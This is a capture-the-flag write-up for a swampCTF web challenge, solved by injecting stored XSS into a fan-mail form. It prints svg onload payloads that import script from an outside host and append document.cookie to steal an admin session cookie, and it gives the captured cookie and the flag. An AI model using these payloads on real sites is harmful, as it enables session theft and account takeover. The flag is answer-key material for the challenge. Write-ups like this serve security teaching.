## Sunset Boulevard

### Description

Welcome to the glitzy world of Broadway! The hit revival of "Sunset Boulevard" starring Nicole Scherzinger has taken the theater world by storm. As part of the fan engagement team, you've discovered a website where fans can send letters to the star. However, rumors suggest that a hidden admin dashboard contains something valuable - possibly the CTF flag.

### Solution

The website was a simple HTML page with a form to send letters to the stars. The form had a name, email and comment field. 

There was a really important hint above the comment box: "Share your thoughts and appreciation with Nicole. All fan mail will be reviewed by our security team before delivery. Fan mail will be delivered to the Broadway box office."

The hint gave me the idea that the comment box was vulvnerable to XSS because it was saying that the fan mail would be reviewed by the security team. Receiving the cookie of an admin or a security team member would be a good way to get the flag.

In the hint of the problem was also mentioned a website for automated XSS payloads. ("https://artoo.love/")

So I tried:
```javascript
<svg onload="import('//popjs.dev/Vfo8F')"></svg>
```
After a short amount of time I received a notification, that someone visited the link. But I didn't receive the cookie. I tried again with a different payload:
```javascript
<svg onload="import('//popjs.dev/Vfo8F' + document.cookie)"></svg>
```

This time I received the cookie inside the notification. I used the cookie to get the flag.
```javascript
 "url": "https://popjs.dev/Vfo8F?admin-auth=authenticated%3B%20swampCTF%3DswampCTF%7BTHIS_MUSICAL_WAS_REVOLUTIONARY_BUT_ALSO_KIND_OF_A_SNOOZE_FEST%7D"
```
The flag was indeed inside the cookie.

### Flag

```
swampCTF{THIS_MUSICAL_WAS_REVOLUTIONARY_BUT_ALSO_KIND_OF_A_SNOOZE_FEST}
``` 